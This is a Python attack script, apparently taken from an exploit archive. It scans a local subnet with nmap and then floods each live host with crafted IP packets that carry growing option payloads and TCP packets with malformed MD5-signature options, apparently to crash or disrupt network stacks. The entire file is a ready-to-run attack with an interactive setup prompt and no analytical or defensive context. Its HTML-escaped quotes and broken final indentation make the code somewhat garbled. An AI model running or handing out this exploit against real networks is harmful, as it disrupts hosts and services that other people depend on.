
import os
import time
import nmap
import struct
from scapy.all import *

def attack(src=&#039;192.168.1.95&#039;, subnet=&#039;192.168.1.0/24&#039;):
    print ("0day.today Scanning network, please wait...")
    nm = nmap.PortScanner()
    nm.scan(hosts=subnet, arguments=&#039;-sP&#039;)
    list_of_ips = nm.all_hosts()
    list_of_ips = sorted(list_of_ips, key=lambda ip: struct.unpack("!L", inet_aton(ip))[0])
    payload = ""
    for i in range(40):
        payload+="x"
        for host in list_of_ips:
            print("[*] Sending Payload to "+host+" | Payload: "+payload)
            send(IP(src=src, dst=host, options=payload)/TCP(options=[(19,"x"*18),(19,"x"*18)]))
            time.sleep(0.2)

if __name__ == &#039;__main__&#039;:
    try:
        if not os.geteuid() == 0:
            sys.exit(&#039;\nscapy requires root privileges.\n&#039;)
        isdefault = input(&#039;Default mode configuration:\nYour IP: 192.168.1.95\nYour subnet: 192.168.1.0/24\nGo to custom configuration ? ["yes"/"no"] &#039;)
        if isdefault==&#039;no&#039;:
            attack()
        else:
            src = input(&#039;What is YOUR IP address ? (example: 192.168.1.95) &#039;)
            subnet = input(&#039;What is the subnet address ? (example: 192.168.1.0/24) &#039;)
            attack(src=src, subnet=subnet)
    except KeyboardInterrupt:
        print(&#039;\nInterrupted\n&#039;)
        try:
            sys.exit(0)
        except SystemExit:
os._exit(0)

